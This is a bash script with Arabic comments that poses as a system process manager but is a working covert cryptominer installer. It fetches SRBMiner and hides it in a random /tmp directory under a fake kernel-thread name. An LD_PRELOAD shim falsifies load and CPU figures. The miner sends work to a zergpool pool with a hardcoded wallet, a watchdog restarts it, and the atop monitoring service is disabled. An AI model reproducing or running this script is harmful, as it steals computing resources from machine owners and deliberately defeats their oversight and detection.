#!/bin/bash
# نظام إدارة العمليات المتقدمة
# --------------------------

# التهيئة الآمنة
export WORK_DIR="/tmp/.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"
echo "WORK_DIR: $WORK_DIR" > status.log
chmod 700 "$WORK_DIR"

# إنشاء وحدة النظام
cat <<'EOF' > core_lib.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/sysinfo.h>

double getloadavg(void *a, int b) { return 0.15; }
pid_t getppid(void) { return 1; }
int get_nprocs(void) { return 1; }
int get_num_procs(void) { return 1; }
unsigned long getauxval(unsigned long type) { return 0; }
EOF

# بناء الوحدة
gcc -shared -fPIC -o core_lib.so core_lib.c -ldl >> status.log 2>&1
chmod 755 core_lib.so

# الحصول على أداة النظام
TOOL_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.5/SRBMiner-Multi-2-8-5-Linux.tar.gz"
wget -qO system_tool.tar.gz "$TOOL_URL" >> status.log 2>&1
tar -xzf system_tool.tar.gz --strip-components=1 >> status.log 2>&1
TOOL_NAME=".sysd-$(tr -dc a-z </dev/urandom | head -c 8)"
install -m 755 SRBMiner-MULTI "$TOOL_NAME" >> status.log 2>&1
echo "TOOL_NAME: $TOOL_NAME" >> status.log

# تهيئة الشبكة
if command -v sudo &> /dev/null; then
    sudo iptables -A OUTPUT -p tcp --dport 3333 -j DROP 2>/dev/null
    sudo sysctl -w net.ipv4.tcp_timestamps=0 >/dev/null
    sudo sysctl -w net.ipv4.tcp_window_scaling=0 >/dev/null
fi

# حساب الوحدات المعالجة (3 ثريدات من أصل 4 أنوية)
UNITS=3

PROC_LABEL="kworker:$(tr -dc a-z </dev/urandom | head -c 6)"
echo "Starting system task: $PROC_LABEL with $UNITS units" >> status.log

# تشغيل المهمة الأساسية
nohup bash -c "
    export LD_PRELOAD='$PWD/core_lib.so';
    export LD_BIND_NOW=1;
    exec -a '[$PROC_LABEL]' '$PWD/$TOOL_NAME' \
      --algorithm rinhash \
      --pool stratum+tcp://rinhash.na.mine.zergpool.com:7148 \
      --wallet LSKZa82yJvDRNdueMHReWvAqcsPz1H9J4n \
      --password c=LTC,mc=RIN,m=solo,ID=systemtask \
      --cpu-threads '$UNITS' \
      --disable-gpu \
      --log-file /dev/null \
      --max-diff 500000 \
      --retry-time 30 \
      --no-watchdog" >> task.log 2>&1 &

# نظام المراقبة المستمرة
cat <<'EOF' > task_monitor.sh
#!/bin/bash
export WORK_PATH="$(pwd)"
export TOOL_NAME="$TOOL_NAME"
export PROC_LABEL="$PROC_LABEL"
export UNITS="$UNITS"

while true; do
  if ! pgrep -f "$TOOL_NAME" >/dev/null; then
    echo "[$(date)] System task inactive, restarting..." >> "$WORK_PATH/monitor.log"
    cd "$WORK_PATH"
    nohup bash -c "
        export LD_PRELOAD='$WORK_PATH/core_lib.so';
        export LD_BIND_NOW=1;
        exec -a '[$PROC_LABEL]' '$WORK_PATH/${TOOL_NAME}' \
          --algorithm rinhash \
          --pool stratum+tcp://rinhash.na.mine.zergpool.com:7148 \
          --wallet LSKZa82yJvDRNdueMHReWvAqcsPz1H9J4n \
          --password c=LTC,mc=RIN,m=solo,ID=systemtask \
          --cpu-threads '$UNITS' \
          --disable-gpu \
          --log-file /dev/null \
          --max-diff 500000 \
          --retry-time 30 \
          --no-watchdog" >> "$WORK_PATH/task.log" 2>&1 &
  fi
  sleep $((RANDOM % 300 + 120))
done
EOF

chmod +x task_monitor.sh
echo "task_monitor.sh created" >> status.log

# بدء المراقبة
nohup ./task_monitor.sh >> monitor.log 2>&1 &
echo "Monitoring started" >> status.log

# تعطيل الخدمات غير الضرورية
if command -v sudo &> /dev/null; then
    sudo systemctl stop atop topgrade 2>/dev/null
    sudo systemctl disable atop 2>/dev/null
fi

# معلومات التشغيل
echo "تم بدء المهمة النظامية بنجاح"
echo "للمراقبة:"
echo "1. تتبع العمليات: ps aux | grep 'kworker'"
echo "2. تتبع السجلات: tail -f $WORK_DIR/task.log"
echo "3. مراقبة الموارد: top"
